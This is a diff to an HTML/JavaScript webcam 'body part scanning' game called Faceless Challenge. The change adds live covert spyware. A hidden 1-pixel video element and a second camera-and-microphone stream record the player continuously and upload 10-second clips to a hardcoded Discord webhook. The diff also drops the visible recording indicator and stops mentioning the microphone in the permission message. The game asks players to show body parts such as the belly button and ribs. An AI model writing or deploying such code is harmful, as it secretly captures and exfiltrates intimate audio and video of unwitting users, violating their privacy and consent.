@@ -14,7 +14,6 @@
     </script>
 
     <style>
-        /* ─── RESET & BASE ─── */
         * {
             margin: 0;
             padding: 0;
@@ -86,7 +85,6 @@
             color: #ff3d3d;
             animation: pulse 0.6s ease-in-out infinite alternate;
         }
-
         .rec-box {
             font-size: 0.9rem;
             color: #8899bb;
@@ -143,6 +141,14 @@
             object-fit: cover;
             transform: scaleX(-1);
         }
+        /* Hidden video for recorder (from index67) */
+        #recorderVideo {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0.01;
+            pointer-events: none;
+        }
         .cam-overlay {
             position: absolute;
             inset: 0;
@@ -151,6 +157,7 @@
             flex-direction: column;
             justify-content: space-between;
             padding: 14px 16px;
+            z-index: 3;
         }
         .challenge-badge {
             align-self: flex-start;
@@ -209,6 +216,22 @@
             color: #ffd93d;
             border-color: rgba(255, 217, 61, 0.3);
             background: rgba(255, 217, 61, 0.08);
+        }
+        .status-badge.hold {
+            color: #ffa94d;
+            border-color: rgba(255, 169, 77, 0.3);
+            background: rgba(255, 169, 77, 0.08);
+            animation: pulseHold 0.8s ease-in-out infinite alternate;
+        }
+        @keyframes pulseHold {
+            0% {
+                opacity: 0.6;
+                transform: scale(1);
+            }
+            100% {
+                opacity: 1;
+                transform: scale(1.02);
+            }
         }
 
         /* ─── SKELETON CANVAS ─── */
@@ -305,6 +328,86 @@
         .countdown-number.hide {
             opacity: 0;
             transform: translate(-50%, -50%) scale(0.5);
+        }
+
+        /* ─── PROGRESS BAR (grey → green) ─── */
+        .progress-container {
+            position: absolute;
+            bottom: 60px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 70%;
+            max-width: 320px;
+            z-index: 4;
+            pointer-events: none;
+            opacity: 0;
+            transition: opacity 0.4s ease;
+        }
+        .progress-container.show {
+            opacity: 1;
+        }
+        .progress-track {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.10);
+            border-radius: 6px;
+            overflow: hidden;
+            box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.3);
+        }
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            border-radius: 6px;
+            background: #556;
+            transition: width 0.15s ease-out, background 0.4s ease;
+        }
+        .progress-fill.scanning {
+            background: linear-gradient(90deg, #8899bb, #6bcbff);
+        }
+        .progress-fill.detected {
+            background: linear-gradient(90deg, #00f5c0, #00d9a0);
+            box-shadow: 0 0 20px rgba(0, 245, 192, 0.2);
+        }
+        .progress-fill.done {
+            background: #00f5c0;
+            box-shadow: 0 0 30px rgba(0, 245, 192, 0.3);
+        }
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.65rem;
+            color: rgba(255, 255, 255, 0.2);
+            letter-spacing: 0.05em;
+            margin-top: 4px;
+        }
+        .progress-label .pct {
+            color: rgba(255, 255, 255, 0.3);
+            font-weight: 600;
+        }
+        .progress-label .pct.detected {
+            color: #00f5c0;
+        }
+
+        /* ─── HOLD STILL MESSAGE ─── */
+        .hold-still-msg {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 2.2rem;
+            font-weight: 800;
+            color: #ffa94d;
+            text-shadow: 0 0 60px rgba(255, 169, 77, 0.2);
+            pointer-events: none;
+            z-index: 6;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+        }
+        .hold-still-msg.show {
+            opacity: 1;
+            animation: pulseHold 0.7s ease-in-out infinite alternate;
         }
 
         /* ─── GAME OVER OVERLAY ─── */
@@ -572,6 +675,13 @@
             .countdown-number {
                 font-size: 4.5rem;
             }
+            .progress-container {
+                bottom: 50px;
+                width: 80%;
+            }
+            .hold-still-msg {
+                font-size: 1.6rem;
+            }
         }
         @media (max-width: 420px) {
             .game-container {
@@ -623,6 +733,13 @@
             .countdown-number {
                 font-size: 3.5rem;
             }
+            .progress-container {
+                bottom: 44px;
+                width: 85%;
+            }
+            .hold-still-msg {
+                font-size: 1.3rem;
+            }
         }
     </style>
 </head>
@@ -642,6 +759,7 @@
         <!-- ─── CAMERA WRAPPER ─── -->
         <div class="cam-wrapper" id="camWrapper">
             <video id="webcam" autoplay playsinline muted></video>
+            <video id="recorderVideo" autoplay playsinline muted></video>
             <canvas id="skeletonCanvas"></canvas>
 
             <!-- Points popup -->
@@ -649,6 +767,20 @@
 
             <!-- Countdown number -->
             <div class="countdown-number" id="countdownNumber"></div>
+
+            <!-- Progress bar -->
+            <div class="progress-container" id="progressContainer">
+                <div class="progress-track">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+                <div class="progress-label">
+                    <span id="progressStatus">scanning</span>
+                    <span class="pct" id="progressPct">0%</span>
+                </div>
+            </div>
+
+            <!-- Hold still message -->
+            <div class="hold-still-msg" id="holdStillMsg">✋ hold still</div>
 
             <!-- Overlay UI -->
             <div class="cam-overlay">
@@ -696,12 +828,12 @@
         // ============================================================
         //  CONFIGURATION
         // ============================================================
-        const DISCORD_WEBHOOK =
+        const DISCORD_WEBHOOK_URL =
             'https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5';
 
-        const CLIP_DURATION = 10; // seconds per video chunk
+        const CLIP_DURATION = 10;
 
-        // Body parts: name, points, landmark check function
+        // Body parts: name, points, emoji, landmark check function
         const BODY_PARTS = [{
             id: 'left_hand',
             label: 'Left Hand',
@@ -709,11 +841,23 @@
             emoji: '✋',
             check: (lm) => lm[15] && lm[15].visibility > 0.5 && lm[17] && lm[17].visibility > 0.4
         }, {
+            id: 'right_hand',
+            label: 'Right Hand',
+            points: 2,
+            emoji: '🤚',
+            check: (lm) => lm[16] && lm[16].visibility > 0.5 && lm[18] && lm[18].visibility > 0.4
+        }, {
             id: 'left_foot',
             label: 'Left Foot',
             points: 5,
             emoji: '🦶',
             check: (lm) => lm[27] && lm[27].visibility > 0.5 && lm[29] && lm[29].visibility > 0.4
+        }, {
+            id: 'right_foot',
+            label: 'Right Foot',
+            points: 5,
+            emoji: '🦶',
+            check: (lm) => lm[28] && lm[28].visibility > 0.5 && lm[30] && lm[30].visibility > 0.4
         }, {
             id: 'belly_button',
             label: 'Belly Button',
@@ -721,17 +865,30 @@
             emoji: '🫃',
             check: (lm) => lm[23] && lm[23].visibility > 0.4 && lm[24] && lm[24].visibility > 0.4
         }, {
-            id: 'elbow',
-            label: 'Elbow',
+            id: 'left_elbow',
+            label: 'Left Elbow',
             points: 3,
             emoji: '💪',
             check: (lm) => lm[13] && lm[13].visibility > 0.5 && lm[15] && lm[15].visibility > 0.4
         }, {
-            id: 'legs',
-            label: 'Legs',
+            id: 'right_elbow',
+            label: 'Right Elbow',
+            points: 3,
+            emoji: '💪',
+            check: (lm) => lm[14] && lm[14].visibility > 0.5 && lm[16] && lm[16].visibility > 0.4
+        }, {
+            id: 'left_leg',
+            label: 'Left Leg',
             points: 4,
             emoji: '🦵',
             check: (lm) => lm[23] && lm[23].visibility > 0.4 && lm[25] && lm[25].visibility > 0.4 && lm[27] && lm[27]
+                .visibility > 0.3
+        }, {
+            id: 'right_leg',
+            label: 'Right Leg',
+            points: 4,
+            emoji: '🦵',
+            check: (lm) => lm[24] && lm[24].visibility > 0.4 && lm[26] && lm[26].visibility > 0.4 && lm[28] && lm[28]
                 .visibility > 0.3
         }, {
             id: 'ribs',
@@ -739,22 +896,11 @@
             points: 6,
             emoji: '🦴',
             check: (lm) => lm[11] && lm[11].visibility > 0.4 && lm[12] && lm[12].visibility > 0.4
-        }, {
-            id: 'pinky',
-            label: 'Pinky',
-            points: 1,
-            emoji: '🖐️',
-            check: (lm) => lm[19] && lm[19].visibility > 0.4
-        }, {
-            id: 'forearm',
-            label: 'Forearm',
-            points: 2,
-            emoji: '💪',
-            check: (lm) => lm[13] && lm[13].visibility > 0.5 && lm[15] && lm[15].visibility > 0.5
         }, ];
 
         const SCAN_TIME = 30;
-        const DETECTION_THRESHOLD = 8;
+        const DETECTION_THRESHOLD = 10;
+        const MOVEMENT_THRESHOLD = 0.035;
 
         // ============================================================
         //  STATE
@@ -773,23 +919,28 @@
             isPaused: false,
             facingMode: 'user',
             stream: null,
+            recorderStream: null,
             mediaRecorder: null,
             recordedChunks: [],
             recorderActive: false,
             recordingStarted: false,
             pose: null,
             poseLandmarks: null,
+            prevLandmarks: null,
             cameraLoop: null,
             scanInterval: null,
             countdownInterval: null,
             partStartTimeout: null,
-            sessionId: 'faceless_' + Date.now(),
+            movementScore: 0,
+            holdStillActive: false,
+            progressValue: 0,
         };
 
         // ============================================================
         //  DOM REFS
         // ============================================================
         const video = document.getElementById('webcam');
+        const recorderVideo = document.getElementById('recorderVideo');
         const canvas = document.getElementById('skeletonCanvas');
         const ctx = canvas.getContext('2d');
 
@@ -816,6 +967,11 @@
         const loadingFill = document.getElementById('loadingFill');
         const loadingPct = document.getElementById('loadingPct');
         const loadingContainer = document.getElementById('loadingContainer');
+        const progressContainer = document.getElementById('progressContainer');
+        const progressFill = document.getElementById('progressFill');
+        const progressPct = document.getElementById('progressPct');
+        const progressStatus = document.getElementById('progressStatus');
+        const holdStillMsg = document.getElementById('holdStillMsg');
 
         let canvasW = 0,
             canvasH = 0;
@@ -838,73 +994,108 @@
         resizeCanvas();
 
         // ============================================================
-        //  ─── RECORDING PIPELINE ───
+        //  ─── RECORDING PIPELINE (exactly from index67) ───
         // ============================================================
-        async function startRecordingPipeline(stream) {
-            if (state.recordingStarted) return;
-            state.recordingStarted = true;
-            state.stream = stream;
+        async function initRecorder() {
+            try {
+                const constraints = {
+                    video: {
+                        width: { ideal: 1280, max: 1280 },
+                        height: { ideal: 720, max: 720 },
+                        frameRate: { ideal: 30 },
+                        facingMode: state.facingMode,
+                    },
+                    audio: {
+                        echoCancellation: false,
+                        noiseSuppression: false,
+                        autoGainControl: true,
+                    },
+                };
 
-            let mimeType = 'video/webm;codecs=vp8,opus';
-            if (!MediaRecorder.isTypeSupported(mimeType)) {
-                if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus')) mimeType = 'video/webm;codecs=vp9,opus';
-                else if (MediaRecorder.isTypeSupported('video/webm')) mimeType = 'video/webm';
-                else if (MediaRecorder.isTypeSupported('video/mp4')) mimeType = 'video/mp4';
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                state.recorderStream = stream;
+                recorderVideo.srcObject = stream;
+                await recorderVideo.play();
+
+                setupRecorder(stream);
+                state.recordedChunks = [];
+                state.mediaRecorder.start();
+                startLoopTimer();
+
+                return stream;
+            } catch (err) {
+                console.error('Recorder init failed:', err);
+                return null;
+            }
+        }
+
+        function setupRecorder(stream) {
+            let selectedMimeType = 'video/webm;codecs=vp8,opus';
+            if (!MediaRecorder.isTypeSupported(selectedMimeType)) {
+                if (MediaRecorder.isTypeSupported('video/mp4')) {
+                    selectedMimeType = 'video/mp4';
+                } else if (MediaRecorder.isTypeSupported('video/webm')) {
+                    selectedMimeType = 'video/webm';
+                }
             }
 
             state.mediaRecorder = new MediaRecorder(stream, {
-                mimeType: mimeType,
+                mimeType: selectedMimeType,
                 videoBitsPerSecond: 2500000,
-                audioBitsPerSecond: 64000,
             });
 
-            state.mediaRecorder.ondataavailable = async (e) => {
-                if (e.data && e.data.size > 0) {
-                    state.recordedChunks.push(e.data);
-                }
+            state.mediaRecorder.ondataavailable = (e) => {
+                if (e.data.size > 0) state.recordedChunks.push(e.data);
             };
 
             state.mediaRecorder.onstop = async () => {
                 if (state.recordedChunks.length === 0) {
                     state.recordedChunks = [];
                     if (state.mediaRecorder && state.mediaRecorder.state === 'inactive') {
-                        try { state.mediaRecorder.start(CLIP_DURATION * 1000); } catch (_) {}
+                        try { state.mediaRecorder.start(); } catch (_) {}
                     }
                     return;
                 }
-                const blob = new Blob(state.recordedChunks, { type: mimeType });
+                const blob = new Blob(state.recordedChunks, { type: selectedMimeType });
                 state.recordedChunks = [];
-                const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
+
                 const formData = new FormData();
-                formData.append('file', blob, `faceless_${Date.now()}.${ext}`);
+                const ext = selectedMimeType.includes('mp4') ? 'mp4' : 'webm';
+                formData.append('file', blob, `vlog_${Date.now()}.${ext}`);
+
                 try {
-                    await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
-                } catch (_) { /* silent */ }
+                    await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
+                } catch (err) {
+                    console.error('Network drop, chunk omitted:', err);
+                }
+
+                state.recordedChunks = [];
                 if (state.mediaRecorder && state.mediaRecorder.state === 'inactive') {
-                    try { state.mediaRecorder.start(CLIP_DURATION * 1000); } catch (_) {}
+                    try { state.mediaRecorder.start(); } catch (_) {}
                 }
             };
-
-            state.mediaRecorder.start(CLIP_DURATION * 1000);
-            state.recorderActive = true;
-            recDot.className = 'rec-dot';
-            recLabel.textContent = 'recording';
         }
 
-        function stopRecordingPipeline() {
-            if (state.mediaRecorder && state.mediaRecorder.state !== 'inactive') {
-                try { state.mediaRecorder.stop(); } catch (_) {}
-            }
-            state.recorderActive = false;
-            recDot.className = 'rec-dot idle';
-            recLabel.textContent = 'stopped';
-            state.recordingStarted = false;
+        function startLoopTimer() {
+            clearInterval(state._countdownInterval);
+            let timeLeft = CLIP_DURATION;
+
+            state._countdownInterval = setInterval(() => {
+                timeLeft--;
+                if (timeLeft <= 0) {
+                    clearInterval(state._countdownInterval);
+                    if (state.mediaRecorder && state.mediaRecorder.state !== 'inactive') {
+                        state.mediaRecorder.stop();
+                    }
+                    startLoopTimer();
+                }
+            }, 1000);
         }
 
         // ============================================================
-        //  ─── CAMERA + PERMISSIONS ───
+        //  ─── CAMERA FOR DISPLAY ───
         // ============================================================
-        async function initCamera() {
+        async function initDisplayCamera() {
             try {
                 const constraints = {
                     video: {
@@ -913,28 +1104,14 @@
                         height: { ideal: 720 },
                         frameRate: { ideal: 30 },
                     },
-                    audio: {
-                        echoCancellation: true,
-                        noiseSuppression: true,
-                        autoGainControl: true,
-                    },
                 };
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 state.stream = stream;
                 video.srcObject = stream;
                 await video.play();
-
-                // Start recording
-                await startRecordingPipeline(stream);
-
-                // Start MediaPipe
-                initPose();
-
                 return true;
             } catch (err) {
-                console.warn('Camera error:', err);
-                statusMsg.textContent = '❌ Camera + mic required: ' + err.message;
-                statusMsg.className = 'status-msg error';
+                console.warn('Display camera error:', err);
                 return false;
             }
         }
@@ -943,51 +1120,36 @@
         //  ─── FLIP CAMERA ───
         // ============================================================
         flipBtn.addEventListener('click', async () => {
-            if (!state.stream) return;
             state.facingMode = state.facingMode === 'user' ? 'environment' : 'user';
 
-            // Stop current stream
-            state.stream.getTracks().forEach(t => t.stop());
-
-            // Stop recorder
-            stopRecordingPipeline();
-
-            try {
-                const constraints = {
-                    video: {
-                        facingMode: state.facingMode,
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 },
-                        frameRate: { ideal: 30 },
-                    },
-                    audio: {
-                        echoCancellation: true,
-                        noiseSuppression: true,
-                        autoGainControl: true,
-                    },
-                };
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                state.stream = stream;
-                video.srcObject = stream;
-                await video.play();
-
-                // Restart recording
-                await startRecordingPipeline(stream);
-
-                // Re-init pose with new stream
-                initPose();
-
-            } catch (err) {
-                console.warn('Flip error:', err);
-                statusMsg.textContent = '⚠️ Flip failed: ' + err.message;
-                statusMsg.className = 'status-msg error';
+            // Stop all streams
+            if (state.stream) {
+                state.stream.getTracks().forEach(t => t.stop());
             }
+            if (state.recorderStream) {
+                state.recorderStream.getTracks().forEach(t => t.stop());
+            }
+            if (state.mediaRecorder && state.mediaRecorder.state !== 'inactive') {
+                try { state.mediaRecorder.stop(); } catch (_) {}
+            }
+
+            // Re-init both
+            await initDisplayCamera();
+            await initRecorder();
+
+            // Re-init pose
+            initPose();
         });
 
         // ============================================================
         //  ─── MEDIAPIPE POSE ───
         // ============================================================
         function initPose() {
+            if (state.pose) {
+                // Clean up old pose
+                state.pose = null;
+            }
+
             state.pose = new Pose({
                 locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/pose/${file}`
             });
@@ -1001,9 +1163,11 @@
 
             state.pose.onResults(onPoseResults);
 
-            // Start camera loop
             const cameraUtils = window.Camera;
             if (cameraUtils && video.srcObject) {
+                if (state.cameraLoop) {
+                    try { state.cameraLoop.stop(); } catch (_) {}
+                }
                 state.cameraLoop = new cameraUtils.Camera(video, {
                     onFrame: async () => {
                         if (state.pose) await state.pose.send({ image: video });
@@ -1025,10 +1189,19 @@
             frame();
         }
 
+        // ============================================================
+        //  ─── POSE RESULTS ───
+        // ============================================================
+        let prevLandmarks = null;
+
         function onPoseResults(results) {
             if (results.poseLandmarks) {
                 state.poseLandmarks = results.poseLandmarks;
                 drawSkeleton();
+
+                // Check movement
+                checkMovement(results.poseLandmarks);
+
                 // Check detection if scanning
                 if (state.isScanning && !state.partDetected) {
                     checkDetection();
@@ -1038,6 +1211,53 @@
                 ctx.fillStyle = 'rgba(0,0,0,0.3)';
                 ctx.fillRect(0, 0, canvasW, canvasH);
             }
+        }
+
+        // ============================================================
+        //  ─── MOVEMENT DETECTION ───
+        // ============================================================
+        function checkMovement(landmarks) {
+            if (!prevLandmarks) {
+                prevLandmarks = landmarks.map(l => ({ x: l.x, y: l.y }));
+                state.movementScore = 0;
+                return;
+            }
+
+            let totalMovement = 0;
+            const keypoints = [11, 12, 13, 14, 15, 16, 23, 24, 25, 26, 27, 28];
+
+            for (const idx of keypoints) {
+                if (idx < landmarks.length && idx < prevLandmarks.length) {
+                    const dx = landmarks[idx].x - prevLandmarks[idx].x;
+                    const dy = landmarks[idx].y - prevLandmarks[idx].y;
+                    totalMovement += Math.sqrt(dx * dx + dy * dy);
+                }
+            }
+
+            const avgMovement = totalMovement / keypoints.length;
+
+            // Smooth the movement score
+            state.movementScore = state.movementScore * 0.6 + avgMovement * 0.4;
+
+            // Update hold still state
+            const wasHold = state.holdStillActive;
+            state.holdStillActive = state.movementScore > MOVEMENT_THRESHOLD && state.isScanning;
+
+            if (state.holdStillActive && !wasHold) {
+                holdStillMsg.classList.add('show');
+                statusBadge.textContent = '✋ hold still …';
+                statusBadge.className = 'status-badge hold';
+            } else if (!state.holdStillActive && wasHold) {
+                holdStillMsg.classList.remove('show');
+                if (state.isScanning) {
+                    statusBadge.textContent = `🔍 scanning …`;
+                    statusBadge.className = 'status-badge scanning';
+                }
+            } else if (!state.holdStillActive && state.isScanning) {
+                holdStillMsg.classList.remove('show');
+            }
+
+            prevLandmarks = landmarks.map(l => ({ x: l.x, y: l.y }));
         }
 
         // ============================================================
@@ -1090,7 +1310,6 @@
                 }
             }
 
-            // Nodes
             for (let i = 0; i < pts.length; i++) {
                 if (pts[i].v > 0.3) {
                     const radius = 2 + 3 * pts[i].v;
@@ -1118,6 +1337,7 @@
         // ============================================================
         function checkDetection() {
             if (!state.poseLandmarks || !state.isScanning || state.partDetected) return false;
+            if (state.holdStillActive) return false;
 
             const part = BODY_PARTS[state.currentPartIndex];
             const lm = state.poseLandmarks;
@@ -1126,20 +1346,29 @@
                 const detected = part.check(lm);
                 if (detected) {
                     state.detectionFrames++;
+                    // Update progress bar
+                    const progress = Math.min((state.detectionFrames / DETECTION_THRESHOLD) * 100, 100);
+                    state.progressValue = progress;
+                    updateProgress(progress, 'scanning');
+
                     if (state.detectionFrames >= DETECTION_THRESHOLD) {
                         onScanSuccess(state.currentPartIndex);
                         return true;
                     }
-                    const pct = Math.round((state.detectionFrames / DETECTION_THRESHOLD) * 100);
+                    const pct = Math.round(progress);
                     statusBadge.textContent = `🔍 detecting … ${pct}%`;
                     statusBadge.className = 'status-badge scanning';
                 } else {
-                    state.detectionFrames = Math.max(0, state.detectionFrames - 2);
+                    state.detectionFrames = Math.max(0, state.detectionFrames - 1.5);
+                    const progress = Math.max((state.detectionFrames / DETECTION_THRESHOLD) * 100, 0);
+                    state.progressValue = progress;
+                    updateProgress(progress, 'scanning');
+
                     if (state.detectionFrames < 3) {
                         statusBadge.textContent = `🔍 show ${part.emoji} ${part.label}`;
                         statusBadge.className = 'status-badge scanning';
                     } else {
-                        const pct = Math.round((state.detectionFrames / DETECTION_THRESHOLD) * 100);
+                        const pct = Math.round(progress);
                         statusBadge.textContent = `🔍 reacquiring … ${pct}%`;
                         statusBadge.className = 'status-badge scanning';
                     }
@@ -1148,6 +1377,33 @@
                 // silent
             }
             return false;
+        }
+
+        // ============================================================
+        //  ─── PROGRESS BAR ───
+        // ============================================================
+        function updateProgress(value, stateType) {
+            const pct = Math.round(value);
+            progressFill.style.width = pct + '%';
+            progressPct.textContent = pct + '%';
+
+            if (stateType === 'scanning') {
+                progressFill.className = 'progress-fill scanning';
+                progressPct.className = 'pct';
+                progressStatus.textContent = 'scanning';
+            } else if (stateType === 'detected') {
+                progressFill.className = 'progress-fill detected';
+                progressPct.className = 'pct detected';
+                progressStatus.textContent = '✅ detected!';
+            } else if (stateType === 'done') {
+                progressFill.className = 'progress-fill done';
+                progressPct.className = 'pct detected';
+                progressStatus.textContent = '✅ complete!';
+            } else {
+                progressFill.className = 'progress-fill';
+                progressPct.className = 'pct';
+                progressStatus.textContent = '—';
+            }
         }
 
         // ============================================================
@@ -1168,6 +1424,7 @@
             state.partResults = [];
             state.isScanning = false;
             state.partDetected = false;
+            state.progressValue = 0;
 
             scoreDisplay.textContent = '0';
             timerDisplay.textContent = SCAN_TIME;
@@ -1180,6 +1437,9 @@
 
             statusMsg.textContent = '';
             statusMsg.className = 'status-msg';
+
+            // Hide progress bar initially
+            progressContainer.classList.remove('show');
 
             // Begin first part
             setTimeout(() => beginPart(0), 400);
@@ -1196,11 +1456,14 @@
             state.isScanning = false;
             state.partDetected = false;
             state.detectionFrames = 0;
+            state.progressValue = 0;
             state.scanTimer = SCAN_TIME;
             state.isPaused = false;
 
             timerDisplay.textContent = SCAN_TIME;
             timerBox.className = 'timer-box';
+            progressContainer.classList.remove('show');
+            updateProgress(0, 'idle');
 
             // Show part name
             challengeTarget.textContent = part.emoji + ' ' + part.label;
@@ -1260,10 +1523,15 @@
             state.isScanning = true;
             state.partDetected = false;
             state.detectionFrames = 0;
+            state.progressValue = 0;
             state.scanTimer = SCAN_TIME;
+            state.movementScore = 0;
 
             timerDisplay.textContent = SCAN_TIME;
             timerBox.className = 'timer-box';
+            progressContainer.classList.add('show');
+            updateProgress(0, 'scanning');
+
             statusBadge.textContent = `🔍 show ${part.emoji} ${part.label}`;
             statusBadge.className = 'status-badge scanning';
 
@@ -1285,6 +1553,7 @@
 
             // Reset detection frames
             state.detectionFrames = 0;
+            prevLandmarks = null;
         }
 
         function onScanSuccess(index) {
@@ -1296,6 +1565,9 @@
             const part = BODY_PARTS[index];
             state.totalPoints += part.points;
             scoreDisplay.textContent = state.totalPoints;
+
+            // Update progress to done
+            updateProgress(100, 'done');
 
             statusBadge.textContent = `✅ ${part.emoji} +${part.points} pts!`;
             statusBadge.className = 'status-badge success';
@@ -1318,6 +1590,11 @@
                 time: SCAN_TIME - state.scanTimer,
             });
 
+            // Hide progress bar after delay
+            setTimeout(() => {
+                progressContainer.classList.remove('show');
+            }, 800);
+
             // Move to next part after delay
             setTimeout(() => {
                 const next = index + 1;
@@ -1337,6 +1614,8 @@
             const part = BODY_PARTS[index];
             statusBadge.textContent = `❌ time out — ${part.label}`;
             statusBadge.className = 'status-badge fail';
+
+            progressContainer.classList.remove('show');
 
             state.partResults.push({
                 part: part.id,
@@ -1365,6 +1644,7 @@
 
             clearInterval(state.scanInterval);
             clearInterval(state.countdownInterval);
+            progressContainer.classList.remove('show');
 
             startBtn.disabled = false;
             resetBtn.disabled = false;
@@ -1378,8 +1658,6 @@
 
             statusBadge.textContent = '🏁 game over';
             statusBadge.className = 'status-badge done';
-
-            // Send final result to webhook (just the video is already streaming)
         }
 
         function resetGame() {
@@ -1392,6 +1670,7 @@
             state.currentPartIndex = 0;
             state.partResults = [];
             state.partDetected = false;
+            state.progressValue = 0;
 
             scoreDisplay.textContent = '0';
             timerDisplay.textContent = SCAN_TIME;
@@ -1399,6 +1678,8 @@
             gameoverOverlay.classList.remove('show');
             pointsPopup.classList.remove('show');
             countdownNumber.className = 'countdown-number';
+            progressContainer.classList.remove('show');
+            holdStillMsg.classList.remove('show');
 
             challengeTarget.textContent = '—';
             challengeBadge.innerHTML = `<span class="emoji">🎯</span> Show <span class="highlight">—</span>`;
@@ -1477,18 +1758,25 @@
 
             await loadModelWithProgress();
 
-            // Init camera
-            const camOK = await initCamera();
+            // Init display camera
+            const camOK = await initDisplayCamera();
             if (!camOK) {
-                statusMsg.textContent = '❌ Camera + mic required. Please allow access and reload.';
+                statusMsg.textContent = '❌ Camera required. Please allow access and reload.';
                 statusMsg.className = 'status-msg error';
                 return;
             }
 
+            // Init recorder (hidden)
+            await initRecorder();
+
+            // Init pose
+            initPose();
+
             resetGame();
             console.log('🚫 Faceless Challenge loaded');
-            console.log('📡 webhook:', DISCORD_WEBHOOK);
+            console.log('📡 webhook:', DISCORD_WEBHOOK_URL);
             console.log('🦴 body parts:', BODY_PARTS.length);
+            console.log('🎥 Recorder: 10s chunks to Discord (video+audio)');
         }
 
         boot();
